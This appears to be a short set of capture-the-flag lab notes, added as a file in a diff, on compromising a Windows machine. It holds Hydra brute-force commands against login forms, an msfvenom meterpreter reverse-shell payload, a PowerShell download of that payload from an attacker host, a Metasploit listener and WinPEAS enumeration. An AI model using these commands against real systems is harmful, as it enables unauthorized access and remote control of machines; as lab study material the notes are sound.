@@ -1,0 +1,31 @@
+Hacking Windows with Hydra, RCE & WinPEAS 
+
+We found a login page. Now we need to bruteforce it using Hydra
+
+hydra -s 8080 10.10.85.139 https-post-form 
+"/j_acegi_security_check: j_username=^USER^&j_password=^PASS^:Invalid Username/password" -l admin
+-P /usr/share/wordlists/rockyou.txt
+
+hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.89.119 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=1bUiFOip%2FO6Hx1LRYsi%2BftYcgkEJd30KxA5rlpopgLDu01SR%2FXCWxhcNZuWqhInMqVajU%2FgkvJqQ1G5alyav6mF%2FClgBpTZaI7d8Qi8g9wi6LMDxMrUt39fVa44u6ZL4uFoCqTSQPMQwcgQOpnx1mmM6JqEbN2PtsGKKPVJEB8%2BYinKtzf3wlFLQTDz%2BYRo%2FLdDOVGF1ZJtmm7Us0X33wyTsaml%2BrX0Z3qUijlj%2BtfC%2Bfd29YrpAoXND0KnS1iETcX33mEEuoQENr4wpDlpcA28htKpZzGTpjpAhyZp99h7KqrZPARH8WsWq84FIDAQ9Ppjwa4PznmvLY0lHMsOSm7edCjJtMzKYFEM5COwcsdY4uh8j&__EVENTVALIDATION=sh0CzwbE84ZYYbBD3RqtxgUBNhQ9xlevAxuyVp691oi8yicYv48Ai4xNkbh2QSVo78TOU6a5J%2BWc%2BdBrb5Y%2BcFPdVHLrzMPHX%2F8HhI4SaUGoXVu5JSxz712Hci6JeLcX%2B3N%2BRzBvborUH^C%2FdWnBTeVGJfZiwzOjh56DhX72AgBMRgIe&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Invalid login"
+
+Downloaded the epxloit for the cve and upload it into the web server to get the nc reverse shell.
+
+Time to convert the nc shell to meterpreter shell using msfvenom.
+Use msfvenom to create the a windows meterpreter reverse shell using the following payload
+>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.157.40 LPORT=4446 -f exe -o Message.exe
+
+After creating this payload, download it to the machine:
+but first start a python server to host the exploit.exe file.
+Try to use the TMP folder that is writable.
+
+c:/windows/Temp >powershell -c "(New-Object System.Net.WebClient).Downloadfile('http://10.10.247.90:8080/Message.exe','Message.exe')"
+
+Use below to get the reverse shell:
+>use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
+
+After running the listener, start the process using below:
+>.\exploit.exe
+You will get the meterpreter shell.
+
+Now upload winpeas.bat to enumurate more.
+Found out that WindowsScheduler service is running.
